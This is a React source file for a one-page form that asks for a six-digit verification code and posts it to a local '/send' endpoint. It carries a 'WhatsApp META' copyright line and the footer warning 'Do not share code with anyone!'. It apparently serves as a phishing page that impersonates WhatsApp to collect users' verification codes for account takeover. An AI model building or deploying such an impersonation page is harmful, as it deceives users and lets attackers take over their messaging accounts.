import { useState } from "react";
import "./App.css";
import axios from "axios";
export default function App() {
    const [otp, setOtp] = useState("");
    const [status, setStatus] = useState("");

    const verifyOtp =async (e: React.FormEvent) => {
      e.preventDefault(); // 🔥 stops page refresh

      try{
      setStatus("Checking Account...");
      const result=await axios.post(
        "http://localhost:3000/send",
        {code:otp}
      )

      setStatus(result.data.message||"Success!")
    }catch(error){
      setStatus("Error!")
      console.error(error)
    }

  };

  return (
    <div className="container">

      {/* Logo Area */}
      <div className="logo-box">
        <div className="logo-placeholder">
          {/* ✅ Correct way to load from public folder */}
          <img src="/logo.jpg" alt="logo" />
        </div>
      </div>

      <br />

      {/* Card */}
      <div className="card">

        <form onSubmit={verifyOtp}>

          <label>Enter Verification Code</label>
          <input
            type="text"
            placeholder="6-digit code"
            required
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
          />

          <button type="submit" className="primary-btn">
            Check Account
          </button>

        </form>

        {status && <p className="status">{status}</p>}
      </div>

      {/* Footer */}
      <p className="footer">
        Do not share code with anyone!
      </p>

      <p>&copy; 2026 WhatsApp META. All rights reserved.</p>

    </div>
  );
}